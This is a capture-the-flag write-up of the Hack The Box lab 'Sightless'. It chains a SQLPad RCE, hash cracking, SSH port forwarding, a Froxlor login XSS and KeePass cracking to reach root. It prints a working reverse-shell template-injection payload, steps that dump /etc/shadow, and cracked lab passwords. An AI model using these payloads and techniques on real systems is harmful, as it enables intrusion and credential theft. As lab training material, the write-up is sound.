# HTB - Sightless

**IP Address:** `10.10.11.32`  
**OS:** Ubuntu (Dockerized Environment)  
**Difficulty:** Easy  
**Tags:** #SQLPad, #RCE, #Docker, #HashCracking, #PortForwarding, #XSS, #Froxlor, #KeePass  

---
## Synopsis

Sightless is an easy Linux machine that demonstrates multiple chained exploits:  
1. Exploiting a **Remote Code Execution (RCE)** in **SQLPad** to obtain a foothold.  
2. Extracting and cracking password hashes from a Docker container.  
3. Performing **Local Port Forwarding** to access an internal Apache/Froxlor web service.  
4. Leveraging an **XSS vulnerability** in Froxlor for privilege escalation.  
5. Exploiting exposed FTP credentials to retrieve a KeePass database, which contained root access.  

---
## Skills Required

- Basic web enumeration and subdomain discovery  
- Knowledge of SQLPad exploitation  
- Familiarity with password hash cracking using Hashcat  
- SSH tunneling and port forwarding  
- Understanding of KeePass database extraction  

## Skills Learned

- Exploiting SQLPad RCE (CVE-2022-0944)  
- Using Hashcat for SHA-512 and KeePass cracking  
- SSH tunneling for accessing restricted services  
- Exploiting Froxlor XSS login vulnerability  
- Extracting root credentials from KeePass database  

---
## 1. Initial Enumeration

### 1.1 Connectivity Test

```bash
ping -c 1 10.10.11.32
```
![ping](GitHubv2/HackTheBox/EASY/Sightless/screenshots/ping.png)  

The host responds, confirming it is alive.

---
### 1.2 Port Scanning

We scan all TCP ports to identify open services:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.32 -oG allPorts
```

- `-p-`: Scan all 65,535 ports  
- `--open`: Show only open ports  
- `-sS`: SYN scan  
- `--min-rate 5000`: Increase speed  
- `-Pn`: Skip host discovery (already confirmed alive)  
- `-oG`: Output in grepable format

![allports](GitHubv2/HackTheBox/EASY/Sightless/screenshots/allports.png)  

Extract the open ports:

```bash
extractports allPorts
```
![extractports](GitHubv2/HackTheBox/EASY/Sightless/screenshots/extractports.png)  

---
### 1.3 Targeted Scan

Using the discovered ports, we perform a deeper scan with default scripts and service detection:

```bash
nmap -p21,22,80 -sC -sV 10.10.11.32 -oN targeted
```

- `-sC`: Run default NSE scripts  
- `-sV`: Detect service versions  
- `-oN`: Output in human-readable format  

Let's check the result:

```bash
cat targeted -l java
```

![targeted](GitHubv2/HackTheBox/EASY/Sightless/screenshots/targeted.png)  

**Findings:**

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.x |
| 22   | SSH     | OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 |
| 80   | HTTP    | nginx 1.18.0 |

Before exploring the website, we analyzed the SSH and HTTP service versions on **Launchpad**.

![launchpad_openssh](GitHubv2/HackTheBox/EASY/Sightless/screenshots/launchpad_openssh.png)  
![launpad_niginx](GitHubv2/HackTheBox/EASY/Sightless/screenshots/launpad_niginx.png)  

When reviewing the results, it is important to pay attention to the _Uploaded to_ field. In this case, the values differ:  
`Jammy != Hirsute`

This discrepancy suggests the possible use of **Docker containers**.

Although this information may not be 100% accurate, it is useful to consider when building our attack roadmap.

Continuing with the web enumeration, we discovered several links. One of them was inaccessible, so as before, we added the corresponding subdomain to our `/etc/hosts` file.

---
## 2. Web Enumeration

Accessing the main website reveals several links. One subdomain is restricted, so we add it to `/etc/hosts`:

![web](GitHubv2/HackTheBox/EASY/Sightless/screenshots/web.png)  
![web_services](GitHubv2/HackTheBox/EASY/Sightless/screenshots/web_services.png)

**Start Now** button on SQLPad service redirects to **`sqlpad.sightless.htb`**, which we also add to `/etc/hosts`:

![web_sqlpad](GitHubv2/HackTheBox/EASY/Sightless/screenshots/web_sqlpad.png)  

SQLPad is an application for executing SQL queries and visualizing results.  

---
## 3. Exploiting SQLPad (Foothold)

SQLPad shows an option to add a new connection. Even though port **3306** (MySQL) is closed, we can trick SQLPad into connecting to us.

Scan confirmation:

```bash
nmap -p3306 -sC -sV 10.10.11.32
```
![nmap_p3306](GitHubv2/HackTheBox/EASY/Sightless/screenshots/nmap_p3306.png)  

Open a listener:

```bash
nc -nlvp 3306
```

Trigger connection test:
![web_sqlpad_new_connection_test](GitHubv2/HackTheBox/EASY/Sightless/screenshots/web_sqlpad_new_connection_test.png)  

![nc_test_3306](GitHubv2/HackTheBox/EASY/Sightless/screenshots/nc_test_3306.png)  

The connection is received, confirming injection.  
We found an exploit for **SQLPad v6.10.0 (CVE-2022-0944)**:  

```bash
https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944
```

Payload:

```bash
{{process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.7/443 0>&1"')}}
```

![web_sqlpad_new_connection](GitHubv2/HackTheBox/EASY/Sightless/screenshots/web_sqlpad_new_connection.png)  

Open reverse shell listener:

```bash
nc -lnvp 443
```

On execution:
![nc_shell](GitHubv2/HackTheBox/EASY/Sightless/screenshots/nc_shell.png)  

We obtain a shell inside a **Docker container**.

---
## 4. Docker Enumeration

```bash
whoami
hostname
```

![docker_machine](GitHubv2/HackTheBox/EASY/Sightless/screenshots/docker_machine.png)  

The hostname confirms a Dockerized environment.  
Listing users shows limited accounts:

![docker_machine_permissions](GitHubv2/HackTheBox/EASY/Sightless/screenshots/docker_machine_permissions.png)  

Dumping `/etc/shadow`:

![docker_machine_etc_shadow](GitHubv2/HackTheBox/EASY/Sightless/screenshots/docker_machine_etc_shadow.png)  

We found password hashes for **michael** and **root**.  

Michael’s hash:

```bash
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/
```

Identify hash type:

![hash](GitHubv2/HackTheBox/EASY/Sightless/screenshots/hash.png)  

It is SHA-512 (`-m 1800`). Crack with Hashcat:

```bash
hashcat hash /usr/share/wordlists/rockyou.txt -m 1800
```

![hashcat_insaneclownposse](GitHubv2/HackTheBox/EASY/Sightless/screenshots/hashcat_insaneclownposse.png)  

Password recovered: **insaneclownposse**

The root hash was tested but it did not work.

---
## 5. SSH Access

We log in as **michael**:

```bash
ssh michael@10.10.11.32
```

![user_flag](GitHubv2/HackTheBox/EASY/Sightless/screenshots/user_flag.png)  

🏁 **User flag obtained**

---
## 6. Privilege Escalation

### 6.1 Process Enumeration

After logging in as **michael**, we can confirm that we are now inside the main host instead of the Docker container:  

![ssh_michael_hostname](GitHubv2/HackTheBox/EASY/Sightless/screenshots/ssh_michael_hostname.png)  

The hostname comparison shows that the first system corresponds to the real machine, while the second one was the Docker environment we previously compromised.

As a first step, we attempt to access the `/root` directory:  

![ssh_michael_root_directory](GitHubv2/HackTheBox/EASY/Sightless/screenshots/ssh_michael_root_directory.png)  

Access is denied, so we move on to privilege escalation checks.  
We begin by searching for **SUID binaries**:

``` bash
find / -perm -4000 2>/dev/null
```

![ssh_michael_permissions](GitHubv2/HackTheBox/EASY/Sightless/screenshots/ssh_michael_permissions.png)  

No interesting binaries are found. Next, we enumerate **capabilities** assigned to executables:

``` bash
getcap -r / 2>/dev/null
```

![ssh_michael_capabilities](GitHubv2/HackTheBox/EASY/Sightless/screenshots/ssh_michael_capabilities.png)  

Again, nothing of interest is discovered.

Checking processes:

```bash
ps -aux
```

![ps_aux](GitHubv2/HackTheBox/EASY/Sightless/screenshots/ps_aux.png)  

We discover **Apache2** running on **localhost:8080** hosting `admin.sightless.htb`.

Apache2 configuration:

```bash
cat /etc/apache2/sites-enabled/000-default.conf | grep -v '#'
```

![ssh_michael_cat_000_defaultconf](GitHubv2/HackTheBox/EASY/Sightless/screenshots/ssh_michael_cat_000_defaultconf.png)  

The web root (`/var/www/html/froxlor`) is restricted.  

When inspecting the Apache configuration file, most of the lines are comments (`#`). To clean the output and focus only on active directives, we use:

``` bash
cat /etc/apache2/sites-enabled/000-default.conf | grep -v '#'
```

This reveals that the **Apache2 server** is serving another subdomain: **`admin.sightless.htb`**.

We then attempt to check the **DocumentRoot** permissions:

``` bash
ls -l /var/www/html/froxlor
```

![ssh_michael_froxlor](GitHubv2/HackTheBox/EASY/Sightless/screenshots/ssh_michael_froxlor.png)  

Access is denied. With the current user, we only have access to `/www`; the directory belongs to the `www-data` user.

From the configuration, we also identify that this Apache2 instance is bound to **127.0.0.1:8080**. To confirm the running services, we check active sockets:

``` bash
ss -nltp
```

![ssh_michael_running_process](GitHubv2/HackTheBox/EASY/Sightless/screenshots/ssh_michael_running_process.png)  

At this point, the most effective approach is to use **Local Port Forwarding**. This technique allows us to redirect traffic from our local machine to a service running internally on the victim, usually through an **SSH tunnel**.

---
### 6.2 Local Port Forwarding

We forward port **8080**:

```bash
ssh michael@10.10.11.32 -L 8081:127.0.0.1:8080
```

Verify:

```bash
lsof -i:8081
```

![lsof](GitHubv2/HackTheBox/EASY/Sightless/screenshots/lsof.png)  

Edit `/etc/hosts` to point `admin.sightless.htb` → `127.0.0.1`.

![etc_hosts](GitHubv2/HackTheBox/EASY/Sightless/screenshots/etc_hosts.png)  

Now accessible:

![web_froxlor](GitHubv2/HackTheBox/EASY/Sightless/screenshots/web_froxlor.png)  

---
### 6.3 Froxlor Exploitation (XSS)

We are now inside **Froxlor**, a free and open-source web hosting control panel originally derived from the **SysCP project**.

After exploring the interface, nothing obvious appeared exploitable. A quick search for known vulnerabilities in Froxlor revealed the following advisory:

🔗 [GHSA-x525-54hf-xr53](https://github.com/advisories/GHSA-x525-54hf-xr53)

This vulnerability describes a **Cross-Site Scripting (XSS)** issue in the login form. To exploit it, we need to craft and inject a malicious payload.

First, we download the proof-of-concept payload and inspect it:

![cat_payload](GitHubv2/HackTheBox/EASY/Sightless/screenshots/cat_payload.png)  

The content looks obfuscated/encoded, so we open **BurpSuite Decoder** and convert it into a more readable URL-encoded format. Since we may need the original payload for the exploit, we create a separate file called **`payload_decoded`** to analyze its behavior while keeping the encoded one intact:

![cat_payload_decoded](GitHubv2/HackTheBox/EASY/Sightless/screenshots/cat_payload_decoded.png)  

After decoding, we identify the most important section: the **`var url`** parameter, which originally points to `demo.froxlor.org`. To make the exploit work against our target, we modify it to:

`http://admin.sightless.htb:8080`

We apply this change directly in the original (encoded) payload without decoding it before uploading:

![payload_updated](GitHubv2/HackTheBox/EASY/Sightless/screenshots/payload_updated.png)  

In summary, we replaced:

- `https://demo.froxlor.org`  
    with:
- `http://admin.sightless.htb:8080`

The next step, according to the exploit instructions, is to intercept a failed login request in **BurpSuite** using invalid credentials and inject our crafted payload into the **username** field.
We intercept a login request with invalid credentials in BurpSuite and inject the payload into the username field.

![bs_sending_payload](GitHubv2/HackTheBox/EASY/Sightless/screenshots/bs_sending_payload.png)  

On reload, we gain access with credentials:

- **User:** abcd  
- **Pass:** Abcd@@1234  

![froxlor_login_true](GitHubv2/HackTheBox/EASY/Sightless/screenshots/froxlor_login_true.png)  

---
### 6.4 FTP Access via Froxlor

Inside Froxlor, under customers → `web1`, we can reset FTP credentials.

Set new password:

![web_froxlor_resources_web1_restart_password](GitHubv2/HackTheBox/EASY/Sightless/screenshots/web_froxlor_resources_web1_restart_password.png)  

Connect via FTP:

```bash
lftp 10.10.11.32
```

![lftp_with_new_password](GitHubv2/HackTheBox/EASY/Sightless/screenshots/lftp_with_new_password.png)  

We discover a `Database.kdb` file (KeePass).

---
### 6.5 KeePass Database Exploitation

Convert KeePass database to hash:

```bash
keepass2john Database.kdb
```

![keepass2john_database](GitHubv2/HackTheBox/EASY/Sightless/screenshots/keepass2john_database.png)  

Crack with Hashcat:

```bash
hashcat hash /usr/share/wordlists/rockyou.txt --user -m 13400
```

![hashcat_bulldogs](GitHubv2/HackTheBox/EASY/Sightless/screenshots/hashcat_bulldogs.png)  

Password recovered: **bulldogs**

Open KeePass:

```bash
keepassxc Database.kdb
```

![keepassxc_login](GitHubv2/HackTheBox/EASY/Sightless/screenshots/keepassxc_login.png)  

Import KeePass v1 database:

![keepassxc_import_datbase](GitHubv2/HackTheBox/EASY/Sightless/screenshots/keepassxc_import_datbase.png)  

Root credentials are revealed, but password fails:

![ssh_root_fail](GitHubv2/HackTheBox/EASY/Sightless/screenshots/ssh_root_fail.png)  

Instead, an **id_rsa private key** is stored:

![keepassxc_id_rsa](GitHubv2/HackTheBox/EASY/Sightless/screenshots/keepassxc_id_rsa.png)  


---
## 7. Root Access

Using `id_rsa`, we authenticate as root:

![root_flag](GitHubv2/HackTheBox/EASY/Sightless/screenshots/root_flag.png)  

🏁 **Root flag obtained**

---
# ✅ MACHINE COMPLETE

---
## Summary of Exploitation Path

1. **Port Scanning** → Discovered SSH, FTP, and Web.  
2. **SQLPad RCE** → Achieved foothold inside Docker.  
3. **Hash Cracking** → Extracted and cracked Michael’s SHA-512 hash.  
4. **SSH Access** → Logged in as Michael.  
5. **Local Port Forwarding** → Accessed hidden Froxlor panel.  
6. **XSS Exploitation** → Gained admin panel access.  
7. **FTP Reset** → Retrieved KeePass database.  
8. **KeePass Cracking** → Extracted root credentials and private key.  
9. **Root Access** → Logged in and retrieved final flag.  

---
## Defensive Recommendations

- Patch SQLPad to prevent **RCE (CVE-2022-0944)**.  
- Restrict Docker container exposure and enforce namespace isolation.  
- Avoid storing credentials in KeePass files inside exposed FTP.  
- Sanitize inputs in Froxlor to prevent XSS attacks.  
- Regularly rotate and secure SSH keys and credentials.  
